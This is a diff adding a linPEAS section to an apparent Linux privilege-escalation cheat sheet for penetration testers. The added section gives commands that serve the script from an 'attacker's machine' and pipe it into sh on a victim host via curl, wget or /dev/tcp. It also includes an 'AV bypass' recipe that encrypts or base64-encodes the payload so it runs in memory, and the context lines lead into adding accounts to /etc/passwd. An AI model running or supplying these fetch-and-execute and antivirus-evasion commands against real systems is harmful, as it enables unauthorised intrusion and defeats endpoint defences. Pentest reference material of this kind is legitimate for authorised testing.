@@ -15,6 +15,67 @@ TODO: Add contents links at the top of each page, and references section at the 
 * [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
 * [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
 
+## `linpeas.sh`
+
+#### Execute from github
+
+```bash
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+```
+
+#### Execute from attacker's machine
+
+```bash
+sudo python -m SimpleHTTPServer 80
+curl 10.10.10.10/linpeas.sh | sh
+```
+
+####  Execute from attacker's machine \(Without curl\)
+
+```bash
+sudo nc -q 5 -lvnp 80 < linpeas.sh
+cat < /dev/tcp/10.10.10.10/80 | sh
+```
+
+####  Output to file
+
+```bash
+# -a to execute all the checks
+linpeas -a > /dev/shm/linpeas.txt
+
+#Read with colors
+less -r /dev/shm/linpeas.txt
+```
+
+### AV bypass
+
+#### Using open-ssl encryption
+
+```bash
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
+
+#Start HTTP server
+sudo python -m SimpleHTTPServer 80
+
+#Download from the victim's machine
+curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh
+```
+
+Using a base64-encoded payload
+
+```bash
+#convert to base64
+base64 -w0 linpeas.sh > lp.enc 
+
+#Start HTTP server
+sudo python -m SimpleHTTPServer 80
+
+#Download from the victim, decode from base64, run in-memory
+curl 10.10.10.10/lp.enc | base64 -d | sh
+#or
+wget -O - http://10.10.10.10/lp.enc | base64 -d | sh
+```
+
 ## /etc/passwd
 
 ### Add Account & Password to /etc/passwd
